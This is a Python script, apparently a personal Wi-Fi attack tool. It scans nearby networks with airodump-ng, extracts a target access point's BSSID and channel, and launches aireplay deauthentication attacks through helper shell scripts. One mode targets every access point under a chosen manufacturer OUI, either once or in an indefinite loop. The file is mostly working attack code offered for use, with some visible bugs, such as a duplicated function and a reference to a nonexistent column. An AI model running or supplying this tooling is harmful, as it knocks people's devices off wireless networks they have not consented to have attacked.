import glob
import os
import random
import signal
import string
import subprocess
import time
import csv
import pandas as pd
import keyboard

# variables
bssid_of_targetAP = 'not found'
channel_of_targetAP = 'not found'
terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']
DeauthTimeout = 0 # if this is 0 then there wont be a timeout, if its any integer other than 0 it will timeout after that integer, timeout is set in some scripts and cleared after that script runs to not cause any issues. timeout is used when multiple APs are targeted


def clear():
    subprocess.run('clear')


def scan_for_networks(interface):
    # airodump =  subprocess.Popen('airodump-ng {} -w /tmp/networks --output-format csv '.format(interface), shell=True)
    airodump = subprocess.Popen('airodump-ng {} -w /tmp/networks --output-format csv &'.format(interface), shell=True,
                                preexec_fn=os.setsid)
    time.sleep(10)
    clear()
    # subprocess.run(["killall", "airodump-ng"])
    # airodump.terminate() this does not work because we are running it with shell=True which creates 2 processes. to kill a process run on shell=True
    # we need to execute this
    os.killpg(airodump.pid,
              signal.SIGTERM)  # but in order for this to work we also have to add preexec_fn=os.setsid to the airodump argument
    time.sleep(0.5)
    files = sorted(glob.glob('/tmp/networks-*.csv'))
    latest_file = files[-1] if files else None
    if latest_file:
        with open(latest_file, 'r') as file:
            print(file.read())
            target_AP = input('Write the Network name of the target AP')
            return target_AP
    else:
        print('no networks found')
        return ""


def process_ssids(file_name):
    df = pd.read_csv(file_name, header=None)
    df.columns = ['bssid', 'ESSID']
    current_oui = None
    for index, row in df.iterrows():
        oui = row['bssid'][:8]
        if oui != current_oui:
            if current_oui:
                print()
            current_oui = oui
            print(f'OUI: {oui}')
        print(f'  - {row["ssid"]} ({row["bssid"]})')


# TODO
def scan_for_networks_by_OUI(interface):
    random_output_file_name = ''.join(random.choice(string.ascii_letters) for _ in range(32))
    random_filtered_output_file_name = ''.join(random.choice(string.ascii_letters) for _ in range(32))
    print('{}.csv'.format(random_filtered_output_file_name))

    # subprocess.run('airodump-ng {} -w /tmp/{}  --output-format csv &'.format(interface, random_output_file_name),shell=True)
    airodump = subprocess.Popen(
        'airodump-ng {} -w /tmp/{}  --output-format csv &'.format(interface, random_output_file_name), shell=True,
        preexec_fn=os.setsid)

    time.sleep(0.1)

    csv_output_location = '/tmp/' + random_output_file_name + '-01.csv'
    csv_output = pd.read_csv(csv_output_location)
    csv_outputa = csv_output['BSSID'] + ',' + csv_output[' ESSID']
    csv_formatted_location = f"/tmp/{random_filtered_output_file_name}.csv"
    os.mknod(csv_formatted_location)
    csv_outputa.to_csv(csv_formatted_location, index=False)

    os.killpg(airodump.pid,
              signal.SIGTERM)  # but in order for this to work we also have to add preexec_fn=os.setsid to the airodump argument
    time.sleep(0.5)
    process_ssids(csv_formatted_location)
    os.remove(f'/tmp/{random_output_file_name}-01.csv')  # '-01' becuase airodump adds a postfix to the csv
    os.remove(csv_formatted_location)
    time.sleep(1)
    # return is used for DEAUTH BY OUI selection in network attacks this file will be looped to find APs in the router


# so i couldnt figure out a way to work with my old shell script. instead of using a python method im calling
# a file from ShellScripts and im sending variables from python to shell then im starting script that relies on those variables

def scan_for_networks_by_OUI(interface):
    subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'], shell=True)


def scan_for_networks_by_OUI_Select_Router(interface):
    subprocess.run(['./ShellScripts/OUIFormatter.sh' + ' ' + f'{interface}'], shell=True)
    return input('Write the OUI of target Router')


def retrieve_info_from_latest_networks_csv_file():
    for filename in os.listdir('/tmp/'):
        if filename.startswith('networks-') and filename.endswith('.csv'):
            latest_file = max([f for f in os.listdir('/tmp/') if 'networks-' in f],
                              key=lambda f: os.path.getctime(os.path.join('/tmp/', f)))
            return '/tmp/' + latest_file


def retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP):
    global bssid_of_targetAP
    global channel_of_targetAP
    reader = csv.reader(open(networks_csv_file, 'r'))
    for row in reader:
        # the output of airodump is 15 columns in csv file
        # 0. column is BSSID
        # 3. column is Channel
        # 13. column is ESSID aka targetAP
        # indexes are starting from 0

        # we need channel and BSSID from here
        ESSID_column_index = len(row) - 2
        if ESSID_column_index >= 0 and row[ESSID_column_index].strip() == targetAP:
            # target information is stored in the row[] variable for now and if we want the channel, BSSID we have to return their indexes mentioned above
            print('row[0] ' + row[0])
            print('row[0] ' + row[3])
            if (row[0] or row[3]) != '':
                bssid_of_targetAP = row[0].strip()
                channel_of_targetAP = row[3].strip()


def Deauth(interface, targetAP):
    global DeauthTimeout
    global bssid_of_targetAP
    global channel_of_targetAP
    print('Gathering information on' + ' ' + targetAP)
    networks_csv_file = retrieve_info_from_latest_networks_csv_file()
    # bssid_of_targetAP, channel_of_targetAP = retrieve_information_from_target_using_csv_file(networks_csv_file,targetAP)
    # turns out decalring multiple variables using a return statement is not avaliable in python although there is a workaround by creating another function...
    # i found it easier to mkae these variables global so i can declare them inside the method and call here
    retrieve_information_from_target_using_csv_file(networks_csv_file, targetAP)
    if (bssid_of_targetAP or channel_of_targetAP) == 'not found':
        print()
        print(targetAP + ' has no BSSID or Channel information cannot continue further' + ' check /tmp/networks-*.csv')
    else:
        clear()
        print('Target BSSID found : ' + bssid_of_targetAP)
        print('Target Channel found : ' + channel_of_targetAP)
        print('Switching interface: ' + interface + ' to channel: ' + channel_of_targetAP)
        switch_channel = ['iwconfig ' + interface + ' channel ' + channel_of_targetAP]
        subprocess.Popen(switch_channel, shell=True)

        print('Starting Deauthentication Attack')
        global terminals
        for terminal in terminals:
            try:
                if (DeauthTimeout == 0):
                    # to execute aireplay in new terminal im sending variables to './ShellScripts/aireplay.sh'
                    Deauth_script = './ShellScripts/aireplay.sh'
                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,interface])  # just so you know shell=True breaks the use of sudo and wont allow this script to run for who knows why
                elif (DeauthTimeout != 0):
                    # this script is used when we have to close the aireplay terminal and open a new one after a given time interval
                    # time intervals are set in the functions like Deauth_By_OUI
                    # if a time interval is needed instead of aireplay.sh the aireplay_with_interval.sh is used
                    Deauth_script = './ShellScripts/aireplay_with_interval.sh'
                    print(DeauthTimeout)
                    subprocess.run([terminal, f'-e {Deauth_script}', bssid_of_targetAP,interface,DeauthTimeout]) # this gives error because DeauthTimeout is an integer and it has to be a string value,
                break
            except FileNotFoundError:
                print('no compatible terminal found: install ' + terminal)


# TODO test at home
def Deauth_By_OUI(interface, targetOUI):
    global DeauthTimeout # I selected Deauth to be done in 1minute intervals in this script
    DeauthTimeout = '10' # its enclosed with '' since we cant send integer with subprocress.run but it gets this variable as an integer IDK WHY but it works
    files = sorted(glob.glob('/tmp/networks-*.csv'))
    latest_file = files[-1] if files else '/tmp/networks-01.csv' ## this else is differnet from the one i used in scan networks because the shell script below will create the /tmp/networks-01.csv in its aireodump function. and if I were to leave it as None like before the script wont run because I pass it as a parameter
    subprocess.run(['./ShellScripts/OUIFormatterKEEPFILE.sh' + ' ' + f'{interface}' + ' ' + f'{latest_file}'], shell=True)   # get csv file
    clear()
    APs_in_OUI = []  # decalre a list to store all APs in OUI
    with open('sorted_ssids.csv', 'r') as f:         # get the row count of entries in csv file
        csv_reader = csv.reader(f)
        for row in csv_reader: #
            if row[0].startswith(targetOUI) and row[1] != '': # row[0] means first entrie
                APs_in_OUI.append(row[1])

    APs_in_OUI_Count = len(APs_in_OUI)
    if APs_in_OUI_Count == 0:
        print('This OUI does not belong to any AP please reselect the OUI by typing 3 in Network attacks')
    else:
        selection = 0
        while selection != '1' and selection != '2' and selection != 'exit':
            print(APs_in_OUI_Count, ' APs found in: ', targetOUI)
            print('type 1 to Deauth ALL APs and quit')
            print('type 2 to Deauth ALL APs INDEFINETELY')
            print('type "exit" to quit')
            selection = input('Selection')
        if selection == "exit":
            return
        if selection == '1':
            for i in APs_in_OUI:
                Deauth(interface,i.strip()) # strip is needed otherwise it wont be able to read csv file since variable may have extra space on front of the AP name
        elif selection == '2':
            stop_flag = False # this is set to lisen for 'q' command from keybaord to stop the loop
            while not stop_flag:
                for i in APs_in_OUI:
                    try:
                        print('Deauthentication Attack has  an INFINITE LOOP.')
                        print('to stop the attack press "ctrl+c" in this terminal. time left 3 seconds')
                        time.sleep(1)
                        print('to stop the attack press "ctrl+c" in this terminal. time left 2 seconds')
                        time.sleep(1)
                        print('to stop the attack press "ctrl+c" in this terminal. time left 1 seconds')
                        time.sleep(1)
                        Deauth(interface, i.strip())
                    except KeyboardInterrupt:
                        stop_flag = True



